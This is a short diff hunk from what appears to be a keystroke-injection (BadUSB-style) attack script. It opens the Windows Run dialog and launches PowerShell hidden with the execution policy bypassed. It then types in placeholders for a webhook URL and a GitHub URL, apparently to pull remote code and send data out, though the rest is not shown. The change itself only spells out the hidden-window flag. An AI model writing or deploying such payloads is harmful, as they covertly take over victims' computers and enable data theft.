@@ -12,7 +12,7 @@ layout("us")
 delay(1000);
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H");
+type("powershell -NoP -Ep Bypass -W Hidden");
 press("ENTER");
 delay(5000);
 type("$hookurl = 'WEBHOOK_HERE'; $ghurl = 'GITHUB_URL_HERE'; ");
